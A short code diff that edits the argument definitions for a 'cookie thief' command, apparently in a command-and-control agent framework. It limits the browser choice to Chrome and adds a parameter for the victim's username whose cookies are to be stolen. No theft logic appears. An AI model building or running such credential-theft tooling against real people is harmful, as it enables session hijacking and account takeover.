@@ -15,13 +15,21 @@ class CookieThiefArguments(TaskArguments):
                 ui_position=1
             ),
             "browser": CommandParameter(
-                name="browser",
+                name="Browser",
                 type=ParameterType.ChooseOne,
-                choices=["chrome", "firefox"],
+                choices=["chrome"],
                 required=False,
-                description="choose the browser to streal cookies from",
+                description="choose the browser to steal cookies from",
                 default_value="chrome",
-            )
+                ui_position=2
+            ),
+            "username": CommandParameter(
+                name="Username",
+                type=ParameterType.String,
+                description="Victim's username from whom to steal the cookies",
+                required=False,
+                ui_position=3
+            ),
         }
 
     async def parse_arguments(self):
